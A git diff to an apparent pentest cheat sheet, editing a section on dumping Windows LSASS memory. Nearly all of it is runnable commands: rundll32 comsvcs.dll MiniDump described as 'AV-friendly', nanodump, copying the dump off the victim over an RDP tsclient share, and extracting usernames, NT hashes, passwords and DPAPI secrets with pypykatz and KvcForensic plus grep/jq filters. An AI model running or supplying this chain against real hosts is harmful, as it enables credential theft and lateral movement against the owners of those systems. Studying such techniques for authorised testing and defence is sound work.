@@ -136,20 +136,27 @@ schtasks /fo LIST /V /tn <Task_Name_Here>
 schtasks /run /tn "Full_Task_Name_Path"
 ```
 
-## lssas.exe Dumping 
+## Lssas Dump
 ```bash
 tasklist | findstr /I lsass.exe
 Get-Process -Id <PID>
-:: Modern, AV-friendly: comsvcs.dll minidump
+:: Modern, AV-friendly: comsvcs.dll minidump (Powershell Friendly)
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full
 :: Task Manager → lsass.exe → Create dump file (GUI route, no binary drop)
 :: nanodump (handle duplication, no MiniDumpWriteDump)
 nanodump.exe --pid <PID> -w lsass.dmp --valid
 - Downlaod using :- Attach Drive to rdp  and  smbclient
+:: Download from Victim: cp File_Name \\tsclient\Drive_Name\File_Name
+:: Upload to Victim:     cp \\tsclient\Drive_Name\File_Name .
+# Dumping Creds via pypykatz
 pypykatz lsa minidump go.dump
 pypykatz lsa minidump go.dump -o json
  ==> cat json | grep -i 'DPAPI' -A5 -B5
- ==> cat json | grep -iE 'username|NT:|password|Domain:' 
+ ==> cat json | grep -iE 'username|NT:|password|Domain:'
+# Dumping Creds via kvcforensics
+./KvcForensic_static --analyze-dump --input out.dmp --output result --templates KvcForensic.json  --full --reveal-secrets --format both
+==> cat result | grep -iE 'user=|domain=|nt=|dpapi=|sha1=' | sed -E 's/((user|domain|nt|dpapi|sha1)=[^ ]+)/\1\n/g'
+==> jq -r '.sessions[] | .. | objects | to_entries[] | select(.value != null and .value != "" and (.key|test("user|domain|nt|sha1|dpapi|password|masterkey";"i"))) | "\(.key)=\(.value)"' result.json | grep -iE 'user=[a-zA-Z0-9$_+.]+|domain=[a-zA-Z0-9_+.]+|nt=[a-zA-Z0-9]+|dpapi=[a-zA-Z0-9]+|sha1=[a-zA-Z0-9]+'
 ```
 
 #### adding...
